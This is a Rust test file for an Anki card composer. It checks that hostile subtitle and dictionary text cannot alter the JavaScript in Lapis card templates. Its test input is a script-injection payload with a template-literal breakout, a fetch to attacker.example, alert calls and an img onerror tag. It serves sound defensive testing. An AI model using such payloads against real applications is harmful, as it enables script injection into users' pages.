// SPDX-License-Identifier: GPL-3.0-only

//! L3: the fields of a card cannot change the scripts of the Lapis templates
//! (T-SEC-001 for cards, ADR 0007 §11). Lapis pastes fields into JavaScript
//! template literals, some through Anki's `text:` filter, which decodes
//! entities: hostile subtitle and dictionary text goes through the composer,
//! Anki's substitution is emulated, and every script must keep its shape.

#![allow(clippy::unwrap_used, clippy::expect_used)]

use nikomiru_anki::compose::{self, DictionaryFields, SceneFields};
use nikomiru_anki::html::escape;
use nikomiru_anki::lapis;

/// What Anki's `text:` filter does: tags out, entities decoded.
fn text_filter(value: &str) -> String {
    let mut out = String::new();
    let mut in_tag = false;
    for c in value.chars() {
        match c {
            '<' => in_tag = true,
            '>' if in_tag => in_tag = false,
            c if !in_tag => out.push(c),
            _ => {}
        }
    }
    out.replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&#96;", "`")
        .replace("&#36;", "$")
        .replace("&#92;", "\\")
        .replace("&amp;", "&")
}

/// Anki's `kanji:` filter: the readings in brackets out.
fn kanji_filter(value: &str) -> String {
    let mut out = String::new();
    let mut depth = 0;
    for c in value.chars() {
        match c {
            '[' => depth += 1,
            ']' if depth > 0 => depth -= 1,
            c if depth == 0 => out.push(c),
            _ => {}
        }
    }
    out
}

/// Anki's `kana:` filter: each `base[reading]` becomes its reading.
fn kana_filter(value: &str) -> String {
    let mut out = String::new();
    let mut word = String::new();
    let mut reading: Option<String> = None;
    for c in value.chars() {
        match (c, reading.as_mut()) {
            ('[', None) => reading = Some(String::new()),
            (']', Some(r)) => {
                out.push_str(r);
                word.clear();
                reading = None;
            }
            (c, Some(r)) => r.push(c),
            (' ', None) => {
                out.push_str(&word);
                word.clear();
            }
            (c, None) => word.push(c),
        }
    }
    out.push_str(&word);
    out
}

/// The script blocks of `template` with each `{{filter:Field}}` replaced as
/// Anki does, fields missing from `fields` empty.
fn scripts(template: &str, fields: &[(String, String)]) -> Vec<String> {
    let mut out = Vec::new();
    let mut rest = template;
    while let Some(open) = rest.find("<script") {
        let after = &rest[open..];
        let body_start = after.find('>').unwrap() + 1;
        let body_end = after.find("</script>").unwrap();
        let mut body = after[body_start..body_end].to_string();
        while let Some(at) = body.find("{{") {
            let end = at + body[at..].find("}}").unwrap();
            let reference = &body[at + 2..end];
            let (filter, field) = reference.rsplit_once(':').unwrap_or(("", reference));
            let value = fields
                .iter()
                .find(|(n, _)| n == field)
                .map(|(_, v)| v.clone())
                .unwrap_or_default();
            let substituted = match filter {
                "text" => text_filter(&value),
                "kanji" => kanji_filter(&value),
                "kana" => kana_filter(&value),
                _ => value,
            };
            body.replace_range(at..end + 2, &substituted);
        }
        out.push(body);
        rest = &after[body_end + "</script>".len()..];
    }
    out
}

fn count(text: &str, needle: &str) -> usize {
    text.matches(needle).count()
}

// T-SEC-001
#[test]
fn hostile_text_cannot_change_the_lapis_scripts() {
    let hostile = "猫`;}fetch(`https://attacker.example/`);function z(){`${alert(1)}\\u{61}</script><img src=x onerror=alert(2)>";
    let dict = DictionaryFields {
        expression: escape(hostile),
        reading: escape(hostile),
        furigana_plain: compose::furigana_plain(hostile, "ねこ`${x}"),
        glossary: format!("<span>{}</span>", escape(hostile)),
        pitch_positions: format!(
            "<ul><li><span style=\"display:inline;\"><span>[</span><span>{}</span><span>]</span></span></li></ul>",
            escape(hostile)
        ),
        pitch_categories: "heiban".into(),
        frequency_rank: "120".into(),
        ..DictionaryFields::default()
    };
    let sentence = compose::sentence(hostile, Some(0), "猫");
    let scene = SceneFields {
        sentence: sentence.clone(),
        cue_sentence: sentence,
        sentence_audio: "[sound:nikomiru_0123456789abcdef.m4a]".into(),
        document_title: escape(hostile),
        ..SceneFields::default()
    };
    let names: Vec<String> = lapis::FIELDS.iter().map(|f| (*f).to_string()).collect();
    let mapping: Vec<(String, String)> = lapis::DEFAULT_MAPPING
        .iter()
        .map(|(f, t)| ((*f).to_string(), (*t).to_string()))
        .collect();
    let value = |name: &str| compose::value(name, &dict, &scene);
    let fields = compose::lapis_safe(compose::fields(&names, &mapping, &value, false).unwrap());
    // what the scripts are with harmless values
    let benign: Vec<(String, String)> =
        names.iter().map(|n| (n.clone(), "x".to_string())).collect();
    for template in [lapis::FRONT, lapis::BACK] {
        let reference = scripts(template, &benign);
        let filled = scripts(template, &fields);
        assert_eq!(reference.len(), filled.len());
        for (want, got) in reference.iter().zip(&filled) {
            for token in ["`", "${", "\\", "</script", "<script"] {
                assert_eq!(
                    count(got, token),
                    count(want, token),
                    "{token:?} added to a script:\n{got}"
                );
            }
        }
    }
    // the tags Lapis pastes into a script
    for tag in compose::tags(&[hostile.to_string()], Some(hostile)) {
        assert!(!tag.contains(['`', '$', '\\', '<', '>']), "{tag}");
    }
}

// T-SEC-001: SCRIPT_TEXT_FIELDS names every field the templates read through
// `text:` inside a script
#[test]
fn the_text_fields_of_the_scripts_are_known() {
    let mut read = Vec::new();
    for template in [lapis::FRONT, lapis::BACK] {
        let mut rest = template;
        while let Some(open) = rest.find("<script") {
            let after = &rest[open..];
            let end = after.find("</script>").unwrap();
            let mut b = &after[..end];
            while let Some(at) = b.find("{{text:") {
                let close = b[at..].find("}}").unwrap();
                read.push(b[at + "{{text:".len()..at + close].to_string());
                b = &b[at + close..];
            }
            rest = &after[end + "</script>".len()..];
        }
    }
    read.sort();
    read.dedup();
    let mut known: Vec<String> = lapis::SCRIPT_TEXT_FIELDS
        .iter()
        .map(|f| (*f).to_string())
        .collect();
    known.sort();
    assert_eq!(read, known);
}
